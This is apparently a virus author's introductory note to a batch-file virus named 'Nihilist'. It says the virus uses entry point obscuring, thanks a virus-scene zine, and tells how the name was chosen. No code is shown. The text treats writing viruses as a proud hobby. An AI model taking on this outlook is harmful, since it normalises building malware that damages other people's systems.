EPO was the last very important and not yet done technique until\n  March 2004. And as you may imagine, it's done now. :).\n\n  I got the idea in writing it long time before, because I thought that every\n  language should have at least one encrypted, one polymorph and one EPO virus.\n  But unfortunatly I forgot the idea, and just picked it up again in 2004, when\n  I read DvL's editional of Batch Zone#4. Much thanks! :)\n\n  The code uses some interesting commands, and it's doubtful that you will understand\n  the whole thing without testing the commands or read Microsoft's help (command /?) :D.\n\n  That's more or less everything I want to say. I don't want to explain everything because\n  everybody who is interested in that will understand it. If not, just send me a mail!\n\n  The History of the name is little strange: I asked my girlfriend if she knows any cool\n  word. She sent me a SMS: 'Nihilist'. Well, First I wanted to use it for my PE vir, then\n  for my MenuetOS vir, but both aren't finished so far and I want to use this name for a\n  virus :).
